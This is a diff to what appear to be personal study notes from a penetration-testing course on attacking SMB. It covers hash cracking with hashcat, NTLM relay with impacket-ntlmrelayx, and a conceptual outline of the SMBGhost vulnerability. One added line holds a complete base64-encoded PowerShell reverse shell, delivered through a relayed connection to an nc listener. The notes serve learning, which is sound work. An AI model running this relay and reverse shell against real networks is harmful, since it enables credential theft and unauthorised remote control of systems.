@@ -19,6 +19,11 @@
     - [[#extract-hashes-from-sam-db][Extract Hashes from SAM DB]]
     - [[#pth][PtH]]
     - [[#forced-authentication-attacks][Forced Authentication Attacks]]
+    - [[#rpc-1][RPC]]
+- [[#latest-smb-vuln-smbghost][Latest SMB Vuln (SMBGhost)]]
+  - [[#concept-of-attack][Concept of Attack]]
+  - [[#initiation-of-attack][Initiation of Attack]]
+  - [[#trigger-rce][Trigger RCE]]
 
 * Attacking SMB
 - =TCP/139=, =UDP/137=, =UDP/138= on top of NetBIOS
@@ -130,6 +135,7 @@ WIN7BOX
 - respond on behalf of servers the victim is looking for & capture NetNTLM hashes
 
 **** Creating fake SMB server
+
 ~responder -I <interface name>~
 - when user/system tries to perform *Name Resolution*, following procedures conducted by win machine to retrieve host IP addr by hostname
   1. hostname file share IP addr req
@@ -216,3 +222,42 @@ biscuitrescue@htb[/htb]$ sudo responder -I ens33
 #+end_src
 
 - =Responder= gives *NTLMv2* type hashes -> hashcat mode 5600
+  - ~hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt~
+  - if hash not cracking, can potentially relay captured hash to another machine (=impacket-ntlmrelayx=) or responder =multirelay.py=
+    - need to set SMB to =OFF= in responder config (=/etc/responder/Responder.conf=)
+    - ~impacket-ntlmrelayx --no-http-server -smb2support -t <ip>~
+    - by default, ntlmrelayx will dump SAM DB, but can exec cmd by using option ~-c~
+    - can create PS revshell ([[https://www.revshells.com/]]), set machine IP, port, PS #3 (Base64)
+      - ~impacket-ntlmrelayx --no-http-server -smb2support -t <ip> -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'~ && ~nc -lvnp 9001~
+
+        
+*** RPC
++ can make changes to system:
+  * change user pass
+  * create new domain user
+  * create new shared folder
+
+* Latest SMB Vuln (SMBGhost)
+- [[https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796][CVE-2020-0796]]
+- consisted of compression mechanism in SMB v3.1.1 -> made win 10 ver 1903, 1909 vuln to attack by unauth attacker (*RCE + full access to remote target system*)
+- =integer overflow= vuln in fn() of SMB driver that allows system commands to be overwritten while accessing memory.
+- vuln occurred because at the time the fn() lacked bounds checking to handle size of data sent in process of SMB session negotiation
+
+** Concept of Attack
+- occurs while processing malformed compressed msg after =Negotiate Protocol Responses=
+- if SMB server allows requests, compression is generally supported
+- client & server set terms of comm before client sends any data
+- if data transmitted exceeds int var limits d/t to amount of data, parts written into buf -> leads to overwriting of subsequent CPU instr & interrupts process's normal exec
+- data sets can be structured so that overwritten instr are replaced w our own, forcing CPU to perform other tasks & instructions
+
+** Initiation of Attack
+1. client sends req manipulated by attacker to SMB server (=CoA Source=)
+2. sent compressed packets processed according to negotiated protocol responses (=CoA Process=)
+3. process performed w atleast admin priv (=CoA Privileges=)
+4. local process used s dest, _c_ should process compressed packets (=CoA Destination=)
+
+** Trigger RCE
+1. sources used in second cycle from prev proc =source=
+2. int overflow occurs by replacing overwritten buf w attacker's instr & forcing CPU to exec those instr
+3. same priv of SMB server used
+4. remote attacker system used as dest, granting access to local system
